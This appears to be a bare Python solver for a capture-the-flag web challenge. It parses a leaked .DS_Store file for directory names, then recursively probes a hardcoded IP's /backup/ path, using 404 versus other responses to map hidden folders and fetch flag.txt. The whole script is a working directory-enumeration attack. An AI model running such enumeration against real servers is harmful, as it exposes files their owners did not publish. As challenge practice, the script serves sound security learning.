import requests
import time
from ds_store import DSStore

def get_dirs():
    dirs = []
    with DSStore.open("DS_Store", "r+") as d:
        for i in d:
            dirs.append(str(i)[1])
    return sorted(list(set(dirs)))

def get_code(directory):
    host = "http://35.207.132.47:85/backup/"
    r = requests.get(host+directory)
    return r.status_code

def get_flag(directory):
    host = "http://35.207.132.47:85/backup/"+directory+"/flag.txt"
    r = requests.get(host)
    print(r.text.strip())

def is_flag(directory):
    return get_code(directory+"/flag.txt") == 200

def get_codes(directory, dirs):
    d404 = []
    d403 = []
    for d in dirs:
        code = get_code(directory + '/' + d)
        time.sleep(1)
        if code == 404:
            d404.append(d)
        else:
            d403.append(d)
    return (d404, d403)

def get_sub_dirs(directory, dirs):
    check = get_codes(directory, dirs)
    dead = check[0]
    alive = check[1]
    if len(alive) != 0:
        for d in alive:
            if(is_flag(directory)):
                get_flag(directory)
                quit()
            get_sub_dirs(directory+'/'+d, dirs)
    elif len(dead) == 3:
        if(is_flag(directory)):
            get_flag(directory)
            quit()

if __name__ == "__main__":
    dirs = get_dirs()
    alive = []
    for d in dirs:
        get_sub_dirs(d, dirs)
